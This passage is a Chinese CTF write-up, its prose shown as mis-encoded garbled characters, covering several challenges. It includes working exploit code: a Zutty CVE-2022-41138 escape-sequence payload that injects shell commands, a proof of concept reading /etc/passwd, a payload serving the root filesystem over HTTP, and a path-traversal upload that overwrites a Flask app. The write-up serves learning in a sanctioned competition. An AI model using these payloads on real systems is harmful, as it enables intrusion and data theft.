g_variant_get(result, "(u)", &pid);
g_variant_unref(result);

char path[1024];
g_snprintf(path, sizeof(path), "/proc/%d/comm", pid);
gchar *comm;
gsize len;
if (g_file_get_contents(path, &comm, &len, &error)) {
  if (g_strcmp0(comm, "getflag3\n") != 0) {
    return respond_error_msg(invocation,
                             "You shall use getflag3 to call me!");
  } else {
    return respond_success(invocation, flag3);
  }
} else {
  return respond_error(invocation, error);
}
```

è¿™ä¸€é—®åè€Œæ¯”è¾ƒå®¹æ˜“ç†è§£ï¼Œæ˜¯éœ€è¦ç”¨ä¸€ä¸ªåå«`getflag3`çš„è¿›ç¨‹å»ä¸æœåŠ¡äº¤äº’ï¼Œæ‰èƒ½æ‹¿åˆ°flag3ã€‚

ä¸€å¼€å§‹ä¹Ÿå°è¯•äº†å„ç§`bash`è„šæœ¬ï¼Œè¯•å›¾ä¼ªé€ è¿›ç¨‹åï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“èƒ½ä¸èƒ½ä¼ªé€ ï¼‰ï¼Œä½†å§‹ç»ˆä¸è¡Œï¼Œæœ€åçªç„¶å‘ç°ï¼Œé™„ä»¶é‡Œç«Ÿç„¶æœ‰ä¸ª`getflag3.c`ï¼Ÿ

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <gio/gio.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#define DEST "cn.edu.ustc.lug.hack.FlagService"
#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
#define METHOD "GetFlag3"
#define INTERFACE "cn.edu.ustc.lug.hack.FlagService"

int main() {
  GError *error = NULL;
  GDBusConnection *connection;
  GVariant *result;

  connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
  if (!connection) {
    g_printerr("Failed to connect to the system bus: %s\n", error->message);
    g_error_free(error);
    return EXIT_FAILURE;
  }

  // Call the D-Bus method
  result = g_dbus_connection_call_sync(connection,
                                       DEST,        // destination
                                       OBJECT_PATH, // object path
                                       INTERFACE,   // interface name
                                       METHOD,      // method
                                       NULL,        // parameters
                                       NULL,        // expected return type
                                       G_DBUS_CALL_FLAGS_NONE,
                                       -1, // timeout (use default)
                                       NULL, &error);

  if (result) {
    g_print("Get result but I won't show you :)\n");
    g_variant_unref(result);
  } else {
    g_printerr("Error calling D-Bus method %s: %s\n", METHOD, error->message);
    g_error_free(error);
  }

  g_object_unref(connection);

  return EXIT_SUCCESS;
}

```

çœ‹æ¥æœåŠ¡å™¨ä¸Šåº”è¯¥ä¹Ÿæœ‰è¿™ä¹ˆä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ”¾åœ¨é‚£é‡Œï¼Œä¸è¿‡æ˜¾ç„¶ï¼Œç›´æ¥ç”¨`bash`å»è°ƒç”¨å®ƒï¼Œä¼šå¾—åˆ°`Get result but I won't show you :)`

ä¸è¿‡è¿™æºä»£ç éƒ½ç»™äº†ï¼Œæˆ‘ä¸æ˜¯å¯ä»¥ç›´æ¥æŠ„ä¸‹æ¥é­”æ”¹ä¸€ä¸‹ï¼ŸæŠŠ`if (result) {`è¿™éƒ¨åˆ†ä»£ç ä¿®æ”¹ä¸ºä¸‹é¢è¿™æ ·ï¼š

```c
if (result) {
    gchar *response;
    g_variant_get(result, "(s)", &response);
    g_print("flag3: %s\n", response);
    g_variant_unref(result);
}
```

ä½†è¦æ€ä¹ˆä¼ªè£…è¿›ç¨‹åå‘¢ï¼Ÿé—®äº†ä¸‹GPTå‘ç°å¯ä»¥ç”¨`prctl`

<img src="images/5f9de1f2-e227-4180-84cd-3ee0856d487f.png" alt="image-20241109190410937" style="zoom:50%;" />

ä¸è¿‡è¿™é‡Œå®ƒå¤šç»™äº†ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œæ‰‹åŠ¨æŠŠå®ƒå»æ‰å³å¯ã€‚æœ€ç»ˆçš„ä»£ç ï¼š

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <gio/gio.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/prctl.h>

#define DEST "cn.edu.ustc.lug.hack.FlagService"
#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
#define METHOD "GetFlag3"
#define INTERFACE "cn.edu.ustc.lug.hack.FlagService"

int main() {
    GError *error = NULL;
    GDBusConnection *connection;
    GVariant *result;

    prctl(PR_SET_NAME, "getflag3", 0, 0, 0);

    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (!connection) {
        g_printerr("Failed to connect to the system bus: %s\n", error->message);
        g_error_free(error);
        return EXIT_FAILURE;
    }

    result = g_dbus_connection_call_sync(connection,
                                         DEST,
                                         OBJECT_PATH,
                                         INTERFACE,
                                         METHOD,
                                         NULL,
                                         NULL,
                                         G_DBUS_CALL_FLAGS_NONE,
                                         -1,
                                         NULL, &error);

    if (result) {
        gchar *response;
        g_variant_get(result, "(s)", &response);
        g_print("flag3: %s\n", response);
        g_variant_unref(result);
    } else {
        g_printerr("Error calling D-Bus method %s: %s\n", METHOD, error->message);
        g_error_free(error);
    }

    g_object_unref(connection);

    return EXIT_SUCCESS;
}

```

## åŠ¨ç”»åˆ†äº«

è¿™é“é¢˜æ˜¯æˆ‘è§‰å¾—æœ€æœ‰æ„æ€çš„é¢˜ä¹‹ä¸€ ~~ï¼ˆåˆ«çš„å¤§ä½¬è§‰å¾—æœ‰æ„æ€çš„é¢˜æˆ‘ä¸ä¼šï¼‰~~ è¿™ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡åˆ©ç”¨ç°æŸ¥çš„CVEå»è§£é¢˜ã€‚

### åªè¦ä¸åœä¸‹ HTTP æœåŠ¡ï¼Œå“åº”å°±ä¼šä¸æ–­å»¶ä¼¸

æˆ‘ä»¬çœ‹åˆ°æœåŠ¡ç«¯çš„æºä»£ç ï¼š

```rust
use std::fs;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::Path;

fn main() -> std::io::Result<()> {
    let address = "127.0.0.1:8000";
    let listener = TcpListener::bind(address)?;

    println!("Serving HTTP on {}", address);

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                handle_connection(stream);
            }
            Err(e) => {
                eprintln!("Connection failed: {}", e);
            }
        }
    }

    Ok(())
}

fn handle_connection(mut stream: TcpStream) {
    let mut buffer = [0; 1024];
    match stream.read(&mut buffer) {
        Ok(_) => {
            let request = String::from_utf8_lossy(&buffer[..]);

            println!("Received request: {}", request.lines().next().unwrap_or(""));
...
```

çœ‹åˆ°è¿™é‡Œå°±å¤Ÿäº†ï¼åé¢çš„ä»£ç å°±æ˜¯å¾ˆå¸¸è§„çš„å¤„ç†HTTPè¯·æ±‚ã€‚

ä¸ºä»€ä¹ˆä¼šæ³¨æ„åˆ°è¿™ä¸ª`println!`å‡½æ•°å‘¢ï¼Ÿè¿™è¿˜å¾—æ„Ÿè°¢å‡ºé¢˜äººåœ¨é¢˜ç›®ä¸­çš„æš—ç¤ºï¼š**å‡ å¹´å‰ç¼–è¯‘çš„æŸ~~ç¥–ä¼ ~~ç»ˆç«¯æ¨¡æ‹Ÿå™¨**ã€‚

æˆ‘åœ¨æ³¨æ„åˆ°è¿™æ¡æš—ç¤ºä¹‹å‰ï¼Œå°è¯•äº†å¾ˆå¤šå…¶ä»–çš„æ–¹æ³•ï¼Œä¾‹å¦‚æƒ³é€šè¿‡åŒæ—¶å‘èµ·ä¸€å¤§å †HTTPè¯·æ±‚æŠŠæœåŠ¡å™¨æå´©ä¹‹ç±»çš„ï¼Œä¸è¿‡ç»Ÿç»Ÿä¸å¥æ•ˆã€‚åé¢æ‰çœ‹åˆ°äº†è¿™ä¸ªæš—ç¤ºï¼Œäºæ˜¯æˆ‘çœ‹äº†ä¸€ä¸‹é™„ä»¶ç»™çš„å…¶ä»–æ–‡ä»¶ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ª`Dockerfile`ï¼š

```dockerfile
# Uncomment "RUN echo"s, then do this locally for testing:
# docker build -t local/anime .
# cat <YOUR_PAYLOAD> | base64 --wrap=0 | docker run --rm --tmpfs /dev/shm:exec --tmpfs /tmp -i local/anime
FROM ustclug/debian:bullseye AS builder

RUN apt update && apt install -y git build-essential python3-dev pkg-config libfreetype-dev libxmu-dev libgles2-mesa-dev && \
    git clone https://git.hq.sig7.se/zutty.git && cd zutty && git checkout 0.12 && \
    ./waf configure && ./waf

FROM ustclug/debian:bullseye
RUN apt update && apt install -y python3 xvfb libfreetype6 libxmu6 libgles2-mesa libegl1 netcat-openbsd curl
COPY --from=builder /zutty/build/src/zutty /usr/local/bin/zutty
# Start it once to create shader cache
RUN timeout -s 9 5 xvfb-run /usr/local/bin/zutty || true
COPY src/fileserver /usr/local/bin/fileserver

# Start fileserver automatically in zutty :)
RUN echo "cd /root/chroot/ && chroot /root/chroot/ fileserver" > /root/.bashrc && \
    mkdir /root/chroot && cp -r /lib* /root/chroot/ && mkdir -p /root/chroot/usr/ /root/chroot/usr/bin/ /root/chroot/usr/local/bin/ && \
    cp -r /usr/lib* /root/chroot/usr/ && cp -r /usr/bin/* /root/chroot/usr/bin/ && cp -r /usr/local/bin/* /root/chroot/usr/local/bin/
COPY src/ /src/

# Note that you cannot just "cat /flag1" directly on server :)
# RUN echo "Submit your program to get real flag1 on server!" > /flag1 && \
#     echo "Submit your program to get real flag2 on server!" > /flag2

CMD ["python3", "-u", "/src/server.py"]

```

æ³¨æ„åˆ°é¢˜ç›®é‡Œè¯´çš„ç»ˆç«¯æ¨¡æ‹Ÿå™¨æ˜¯æŒ‡`zutty`ï¼Œç‰ˆæœ¬ä¸º`0.12`ï¼Œç«‹åˆ»å»æŸ¥ç›¸å…³çš„CVEï¼ŒæŸ¥åˆ°äº†[è¿™ä¸ªé“¾æ¥](https://nvd.nist.gov/vuln/detail/CVE-2022-41138)ã€‚

> In Zutty before 0.13, DECRQSS in text written to the terminal can achieve arbitrary code execution.

æ˜¯è¯´å¦‚æœæˆ‘ä»¬èƒ½ä»»æ„æ§åˆ¶æ‰“å°åˆ°`zutty`ç»ˆç«¯ä¸Šçš„å†…å®¹çš„è¯ï¼Œå°±å¯ä»¥é€šè¿‡ä¸€ä¸ªå«`DECRQSS`çš„ä¸œè¥¿æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è€Œè¿™ä¸œè¥¿æ˜¯ä¸ªå•¥å‘¢ï¼ŸæŸ¥äº†ä¸€ä¸‹å‘ç°è¿˜æŒºå¤æ‚ï¼Œä¸è¿‡å¥½åœ¨åˆšåˆšé‚£ä¸ªç½‘é¡µç»™äº†ä¸€ä¸ªæœ‰ç”¨çš„[é“¾æ¥](https://bugs.gentoo.org/868495)ï¼Œè¿™ä¸ªé“¾æ¥åˆ™ç»™äº†ä¸€ä¸ªåˆ©ç”¨æ­¤CVEçš„payloadï¼Œä»¥åŠ`zutty`ä¿®å¤è¿™ä¸ªCVEçš„patchï¼š

<img src="images/bb300cf1-25f4-44a3-add7-ae52849bcba8.png" alt="image-20241109191608825" style="zoom:50%;" />

è¿™ä¸ª`poc.txt`çš„å†…å®¹å¦‚ä¸‹ï¼š

```python
with open('poc.txt', 'rb') as f:
    print(f.read())
    
b'\x1bP$q\ncat /etc/passwd\n\x1b\\\n'
```

ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è¯•å›¾å»æ„é€ ç±»ä¼¼äºè¿™ç§æ ·å­çš„payloadï¼Œè®©æœåŠ¡ç«¯æ‰“å°å‡ºè¿™æ ·çš„ä¸œè¥¿ï¼Œå°±èƒ½æ‰§è¡Œä¸€äº›å‘½ä»¤äº†ã€‚

ææ‡‚äº†è¿™äº›ä»¥åï¼Œå°±çŸ¥é“æˆ‘ä»¬éœ€è¦æ³¨æ„æœåŠ¡ç«¯æºä»£ç çš„è¿™ä¸€è¡Œï¼š

```rust
println!("Received request: {}", request.lines().next().unwrap_or(""));
```

å®ƒä¼šæŠŠæˆ‘ä»¬å‘èµ·çš„è¯·æ±‚çš„ç¬¬ä¸€è¡Œæ‰“åˆ°å±å¹•ä¸Šï¼Œæ³¨æ„æ˜¯**ç¬¬ä¸€è¡Œ**ï¼Œè¿™ä¹Ÿæ„å‘³ç€ï¼Œå¦‚æœæŒ‰å‰é¢çš„payloadé‚£æ ·åœ¨ä¸­é—´æ’å…¥ä¸€äº›æ¢è¡Œç¬¦`\n`ï¼Œå°±è¾¾ä¸åˆ°åŒæ ·çš„æ•ˆæœï¼Œå¥½åœ¨æˆ‘ä»¬è¿˜å¯ä»¥ç”¨`\r`ä»£æ›¿`\n`ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠpayloadæ”¹æˆï¼š

```raw
b'\x1bP$q\r???\r\x1b\\\n'
```

ä¸è¿‡`???`å¤„è¦å¡«ä»€ä¹ˆä¸œè¥¿å¯ä»¥è®©æœåŠ¡é€€å‡ºå‘¢ï¼Ÿæˆ‘ä¸€å¼€å§‹ä¸€ç›´åœ¨æƒ³æœ‰ä»€ä¹ˆè®©æœåŠ¡é€€å‡ºçš„å‘½ä»¤ï¼Œç»“æœå‘è¿‡å»å‘ç°ä¸€ä¸ªéƒ½ä¸èƒ½è¿è¡Œèµ·æ¥ã€‚åæ¥æ‰æ„è¯†åˆ°ï¼Œæ–‡ä»¶æœåŠ¡é˜»å¡äº†ç»ˆç«¯ï¼Œä½ å‘½ä»¤èƒ½è¿è¡Œå°±æ€ªäº†ã€‚

ç„¶åæˆ‘æƒ³åˆ°å¹³æ—¶æˆ‘ä»¬è‡ªå·±åœ¨ç»ˆç«¯ä¸Šè®©æœåŠ¡åœä¸‹æ¥ï¼Œå¥½åƒä¸€èˆ¬éƒ½æ˜¯æŒ‰<kbd>Ctrl</kbd> + <kbd>C</kbd>ã€‚æŸ¥äº†ä¸€ä¸‹å‘ç°è¿™ä¸ªç»„åˆé”®å…¶å®æ˜¯å‘ç»ˆç«¯å‘é€äº†ä¸€ä¸ª`\x03`ã€‚

äºæ˜¯ï¼š

```raw
b'\x1bP$q\r\x03\r\x1b\\\n'
```

è¿™æ ·å°±å¯ä»¥æ‹¿åˆ°flag1äº†ã€‚

æœ€ç»ˆçš„è§£é¢˜ä»£ç ï¼š

```python
#!/usr/bin/env python3

import socket

payload = b'\x1bP$q\r\x03\r\x1b\\'

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(('127.0.0.1', 8000))
    s.sendall(payload)

```

### å¸Œæœ›çš„ç»ˆç«¯æ¨¡æ‹Ÿå™¨ï¼Œè¿æ¥ç€æˆ‘ä»¬çš„ç¾ç»Š

è¿™ä¸€é—®ï¼Œæˆ‘ä»¬éœ€è¦æ‹¿åˆ°ä½äºæœåŠ¡å™¨æ ¹ç›®å½•çš„flag2ã€‚

å¾ˆè‡ªç„¶æƒ³æ³•æ˜¯ï¼Œæˆ‘ä»¬ç°åœ¨ç›¸å½“äºå¯ä»¥åœ¨ç»ˆç«¯ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤äº†ï¼Œåªæ˜¯çœ‹ä¸åˆ°ç»ˆç«¯çš„è¾“å‡ºå†…å®¹ã€‚

```raw
b'\x1bP$q\r\x03\r???\r\x1b\\\n'
```

åœ¨`???`å¤„æ’å…¥ä»»æ„çš„å‘½ä»¤ï¼Œåº”è¯¥éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¹¶ä¸”ä¸å­˜åœ¨`chroot`é™åˆ¶ã€‚

ä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯ï¼Œæˆ‘é€šè¿‡ä¸€ä¸ªæ“ä½œæŠŠ`/flag2`æ¬åˆ°å½“å‰ç›®å½•ï¼Œç„¶åé‡æ–°æŠŠ`fileserver`å¯åŠ¨èµ·æ¥ï¼Œå†å‘`flieserver`å‘èµ·ä¸€ä¸ª`GET /flag2`ï¼Œå°±è¡Œäº†ã€‚ç»“æœè¯•äº†å¥½ä¹…æ‰å‘ç°è¿™ä¸ªå½“å‰ç›®å½•å±…ç„¶æ˜¯åªè¯»çš„ã€‚äºæ˜¯è¿™é“é¢˜å¡äº†å°åŠå¤©ã€‚

åˆ°äº†æ™šä¸Šçªç„¶æƒ³èµ·ï¼Œæˆ‘ä¸ºä»€ä¹ˆéå¾—ç”¨ä»–æä¾›çš„æ–‡ä»¶æœåŠ¡å‘¢ï¼Ÿæˆ‘ä¸æ˜¯è¿˜æœ‰`Python`ï¼Ÿ

äºæ˜¯å†™å‡ºä¸‹é¢payloadï¼š

```raw
b'\x1bP$q\r\x03\rpython3 -m http.server 8080 --directory /\r\x1b\\',
```

è¿™æ ·å°±å¯ä»¥æŠŠä»–çš„æœåŠ¡å¹²æ‰ä»¥åå¼€ä¸€ä¸ª`Python`çš„æ–‡ä»¶æœåŠ¡å™¨ï¼Œè€Œä¸”å¯ä»¥æŒ‡å®šæ ¹ç›®å½•ä¸ºå½“å‰ç›®å½•ã€‚

æœ€ç»ˆçš„è„šæœ¬å¦‚ä¸‹ï¼š

```python
#!/usr/bin/env python3

import socket
import time
import re

payloads = [
    b'\x1bP$q\r\x03\rpython3 -m http.server 8080 --directory /\r\x1b\\',
    b'GET /flag2\r\n\r\n'
]


def request(port, payload):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('127.0.0.1', port))
        s.sendall(payload)
        response = b""
        while 1:
            data = s.recv(4096)
            if not data:
                break
            response += data
        return response.decode()


request(8000, payloads[0])
time.sleep(0.5)
flag2 = request(8080, payloads[1])
print(re.search(r'flag\{.*}', flag2).group())

```

ä½¿ç”¨æ­¤è„šæœ¬å¯ä»¥ä¸€æ¬¡æ‹¿ä¿©flagã€‚

## å…³ç¯

### Easy & Medium & Hard

å‰ä¸‰é—®é€åˆ†ï¼Œç›´æ¥ç”¨`z3`ï¼š

[è§£é¢˜ä»£ç ](https://gist.github.com/windshadow233/55180c5e648be86f5ffcb950968e6f24)

ç¬¬å››é—®å¤æ‚åº¦ç‚¸äº†ï¼Œä¼°è®¡å¾—ç”¨ä»€ä¹ˆæ–¹æ³•ä¼˜åŒ–ï¼Œæ²¡æ€ä¹ˆç ”ç©¶ã€‚

## ç¦æ­¢å†…å·

ä¸çŸ¥é“ä¸ºå•¥è¿™é¢˜ä¸€å¼€å§‹åšçš„äººé‚£ä¹ˆå°‘ï¼Œå®³å¾—æˆ‘ä¸€ç›´æ²¡å»çœ‹ã€‚åæ¥çœ‹äº†ä¸€çœ¼ï¼Œå‘ç°æå…¶é€åˆ†ï¼Œä»å¼€å§‹çœ‹æºä»£ç åˆ°æ‹¿åˆ°flagï¼Œåº”è¯¥ä¸è¶…è¿‡10åˆ†é’Ÿã€‚

æºä»£ç å¦‚ä¸‹ï¼š

```python
from flask import Flask, render_template, request, flash, redirect, jsonify
import json
import os
import traceback
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(64)

UPLOAD_DIR = "/tmp/uploads"

os.makedirs(UPLOAD_DIR, exist_ok=True)

# results is a list
try:
    with open("results.json") as f:
        results = json.load(f)
except FileNotFoundError:
    results = []
    with open("results.json", "w") as f:
        json.dump(results, f)


def get_answer():
    # scoring with answer
    # I could change answers anytime so let's just load it every time
    with open("answers.json") as f:
        answers = json.load(f)
        # sanitize answer
        for idx, i in enumerate(answers):
            if i < 0:
                answers[idx] = 0
    return answers


@app.route("/", methods=["GET"])
def index():
    return render_template("index.html", results=sorted((results))


@app.route("/submit", methods=["POST"])
def submit():
    if "file" not in request.files or request.files['file'].filename == "":
        flash("ä½ å¿˜äº†ä¸Šä¼ æ–‡ä»¶")
        return redirect("/")
    file = request.files['file']
    filename = file.filename
    filepath = os.path.join(UPLOAD_DIR, filename)
    file.save(filepath)

    answers = get_answer()
    try:
        with open(filepath) as f:
            user = json.load(f)
    except json.decoder.JSONDecodeError:
        flash("ä½ æäº¤çš„å¥½åƒä¸æ˜¯ JSON")
        return redirect("/")
    try:
        score = 0
        for idx, i in enumerate(answers):
            score += (i - user[idx]) * (i - user[idx])
    except:
        flash("åˆ†æ•°è®¡ç®—å‡ºç°é”™è¯¯")
        traceback.print_exc()
        return redirect("/")
    # ok, update results
    results.append(score)
    with open("results.json", "w") as f:
        json.dump(results, f)
    flash(f"è¯„æµ‹æˆåŠŸï¼Œä½ çš„å¹³æ–¹å·®ä¸º {score}")
    return redirect("/")
```

èŠ±é‡Œèƒ¡å“¨çš„ç®—åˆ†åŠŸèƒ½ï¼Œæ ¹æœ¬ä¸ç”¨çœ‹ï¼Œåªè¦æ„è¯†åˆ°åœ¨`/submit`æ¥å£æœ‰ä¸€ä¸ªè·¯å¾„ç©¿è¶Šæ¼æ´å°±è¡Œäº†ï¼Œå› ä¸ºå®ƒæ˜¯ç”¨`os.path.join`æ¥æ‹¼æ¥è·¯å¾„çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åç±»ä¼¼äº`../../balabala`è¿™ç§ï¼Œæˆ‘ä»¬å°±åŸºæœ¬å¯ä»¥æƒ³ä¸Šä¼ åˆ°å“ªå°±ä¸Šä¼ åˆ°å“ªã€‚

æ³¨æ„åˆ°é¢˜ç›®å‘Šè¯‰äº†æˆ‘ä»¬ï¼šç½‘ç«™ä»£ç è¿è¡Œåœ¨ `/tmp/web`ï¼Œè€Œä¸”ä»–ç”šè‡³è¿˜å¼€äº†`--reload`ã€‚æ—¢ç„¶ç½‘ç«™æ˜¯ç”¨`flask`å†™çš„ï¼Œé‚£æˆ‘ç›²çŒœä¸€æ³¢ä¸»æ–‡ä»¶åœ¨`/tmp/web/app.py`ï¼Œè€Œæˆ‘ä»¬ä¸Šä¼ çš„è·¯å¾„åœ¨`/tmp/uploads`ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶`../web/app.py`ï¼Œè¿™ä¸ªæ“ä½œåˆ™å¯ä»¥ç”¨`requests`å®ç°ï¼š

```python
import requests

url = 'https://chal02-drfrs8jw.hack-challenge.lug.ustc.edu.cn:8443/'
file = 'backend.py'

with open(file, 'rb') as f:
    files = {'file': ('../web/app.py', f)}
    response = requests.post(url + 'submit', files=files)

```

è€Œ`backend.py`æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥å»å†™æ‹¿flagçš„é€»è¾‘äº†ï¼Œæ¯”å¦‚æŠŠindexè·¯å¾„çš„è¯·æ±‚æ”¹äº†ï¼š

```python
@app.route("/", methods=["GET"])
def index():
    with open("answers.json") as f:
        answers = json.load(f)[:100]
    ascii_answers = ''.join(chr(num + 65) for num in answers if isinstance(num, int))
    return ascii_answers
    # return render_template("index.html", results=sorted(results))
```

è¿™æ ·è®¿é—®ç½‘ç«™æ ¹è·¯å¾„å°±å¯ä»¥ç›´æ¥æ‹¿åˆ°flagã€‚

## å“ˆå¸Œä¸‰ç¢°æ’

### ä¸‰ç¢°æ’ä¹‹ä¸€

æœ€åä¸€ä¸ªæ¯”èµ›æ—¥çš„æ™šä¸Šï¼Œçœ‹è¿™é¢˜åšçš„äººæ¯”è¾ƒå¤šï¼Œæˆ‘ä¹Ÿæ¥è¯•è¯•å§ï¼

ç”¨idaæ‰“å¼€æ­¤é¢˜çš„æ–‡ä»¶ï¼š

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+8h] [rbp-F8h]
  int j; // [rsp+Ch] [rbp-F4h]
  int k; // [rsp+10h] [rbp-F0h]
  int c; // [rsp+14h] [rbp-ECh]
  FILE *stream; // [rsp+18h] [rbp-E8h]
  int v9; // [rsp+24h] [rbp-DCh]
  int v10; // [rsp+28h] [rbp-D8h]
  int v11; // [rsp+2Ch] [rbp-D4h]
  _QWORD v12[4]; // [rsp+30h] [rbp-D0h] BYREF
  char s1[17]; // [rsp+50h] [rbp-B0h] BYREF
  char v14[17]; // [rsp+61h] [rbp-9Fh] BYREF
  char v15[134]; // [rsp+72h] [rbp-8Eh] BYREF
  unsigned __int64 v16; // [rsp+F8h] [rbp-8h]
  __int64 savedregs; // [rsp+100h] [rbp+0h] BYREF

  v16 = __readfsqword(0x28u);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  for ( i = 0; i <= 2; ++i )
  {
    printf("Data %d:", (unsigned int)(i + 1));
    if ( (unsigned int)__isoc99_scanf("%16s", &s1[17 * i]) != 1
      || (unsigned int)hex_to_bin(&s1[17 * i], (__int64)&v12[i], 8uLL) )
    {
      fwrite("Invalid input\n", 1uLL, 0xEuLL, stderr);
      return 1;
    }
  }
  if ( !strcmp(s1, v14) || !strcmp(s1, v15) || !strcmp(v14, v15) )
  {
    puts("Input should be different");
    return 1;
  }
  for ( j = 0; j <= 2; ++j )
  {
    SHA256(&v12[j], 8LL, &v15[32 * j + 30]);
    *(&v9 + j) = 0;
    for ( k = 0; k <= 3; ++k )
      *(&v9 + j) = *((unsigned __int8 *)&savedregs + 32 * j + k - 84) | (*(&v9 + j) << 8);
  }
  if ( v9 == v10 && v10 == v11 )
  {
    stream = fopen("flag1", "r");
    if ( !stream )
    {
      fwrite("Can't open file\n", 1uLL, 0x10uLL, stderr);
      return 1;
    }
    while ( 1 )
    {
      c = fgetc(stream);
      if ( c == -1 )
        break;
      putchar(c);
    }
    fclose(stream);
  }
  else
  {
    puts("Wrong answer");
  }
  return 0;
}
```

ä½†æˆ‘ä¸å¤ªç†Ÿæ‚‰Cè¯­è¨€ï¼Œè¿™ä»£ç çœ‹çš„æ˜¯çœŸå¤´å¤§ã€‚å¥½åœ¨ä¸€é¡¿åˆ†æï¼Œæˆ‘å†™å‡ºäº†ç­‰ä»·çš„Pythonä»£ç ï¼š

```python
import random
from hashlib import sha256

hexes = ['abcd1234efefcaca', 'deadbeefdeadbeef', '123a4367deadbeef']

v12 = [bytes.fromhex(_) for _ in hexes]
print(v12)
ans = [0, 0, 0]  # v9 v10 v11
v15 = bytearray(b'\x00' * 30)  # -142 -> -8
# 30->61  å– 58 59 60 61 # ç¬¬ä¸€æ¬¡hashçš„æœ€åå››ä¸ªå­—èŠ‚
# 62->93  å– 90 91 92 93  # ç¬¬äºŒæ¬¡hashçš„æœ€åå››ä¸ªå­—èŠ‚
# 94->125  å– 122 123 124 125 # ç¬¬ä¸‰æ¬¡hashçš„æœ€åå››ä¸ªå­—èŠ‚
# -84 -83 -82 -81
# -52 -51 -50 -49
# -20 -19 -18 -17
for j in range(3):
    v15.extend(sha256(v12[j]).digest())
    for k in range(4):
        ans[j] = v15[58 + 32 * j + k] | (ans[j] << 8)
        print(v15[58 + 32 * j + k])
        print(f'{j=},{ans[j]=}')

```

è¿™æ ·çœ‹å°±æ¸…æ™°å¤šäº†ï¼Œæˆ‘ä»¬å…¶å®åªè¦ç¢°æ’`sha256`çš„æœ€å4ä¸ªå­—èŠ‚å°±è¡Œäº†ï¼Œè¿™å¹³å‡ä¹Ÿå°±åªéœ€è¦ç¢°æ’256 ** 4æ¬¡ï¼Œä¼¼ä¹æ˜¯å¯æ¥å—çš„ã€‚

ä¸è¿‡è¿™å¦‚æœç”¨`Python`æ¥å†™ï¼Œå¾—è·‘åˆ°çŒ´å¹´é©¬æœˆäº†ã€‚äºæ˜¯æˆ‘ï¼ˆåœ¨GPTçš„è¾…åŠ©ä¸‹ï¼‰å†™äº†ä¸ªCç¨‹åºï¼š

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/sha.h>
#include <time.h>

void bytes_to_hex(const unsigned char *bytes, size_t len, char *hex_output) {
    for (size_t i = 0; i < len; ++i) {
        sprintf(hex_output + i * 2, "%02x", bytes[i]);
    }
}

int main() {
    char *a = "89629d7e0868d3d9";
    char ans[3][17] = {0};
    strncpy(ans[0], a, 16);

    unsigned char a_bytes[8];
    for (int i = 0; i < 8; i++) {
        sscanf(a + 2 * i, "%2hhx", &a_bytes[i]);
    }

    unsigned char h[4];
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256(a_bytes, 8, hash);
    memcpy(h, hash + SHA256_DIGEST_LENGTH - 4, 4);

    srand((unsigned int)time(NULL));

    int found = 1;
    unsigned long long attempts = 0;
    while (found < 3) {
        // ç”Ÿæˆ8å­—èŠ‚çš„éšæœºæ•°
        unsigned char b[8];
        for (int i = 0; i < 8; i++) {
            b[i] = rand() % 256;
        }

        unsigned char b_hash[SHA256_DIGEST_LENGTH];
        SHA256(b, 8, b_hash);

        attempts++;

        if (memcmp(b_hash + SHA256_DIGEST_LENGTH - 4, h, 4) == 0) {
            bytes_to_hex(b, 8, ans[found]);
            printf("Found match: %s\n", ans[found]);
            found++;
        }

        if (attempts % 1000000 == 0) {
            printf("Total found: %d, Attempts so far: %llu\n", found, attempts);
        }
    }

    for (int i = 0; i < 3; i++) {
        printf("%s\n", ans[i]);
    }

    return 0;
}
```

<img src="images/101d6739-c85b-413f-81a8-1175afd0f35a.png" alt="image-20241109195444240" style="zoom:50%;" />

å®æµ‹å¤§çº¦è·‘äº†90äº¿æ¬¡ä»¥åï¼Œç¨‹åºç¢°å‡ºäº†ä¸¤ä¸ªå€¼ã€‚

## é›¶çŸ¥è¯†æ•°ç‹¬

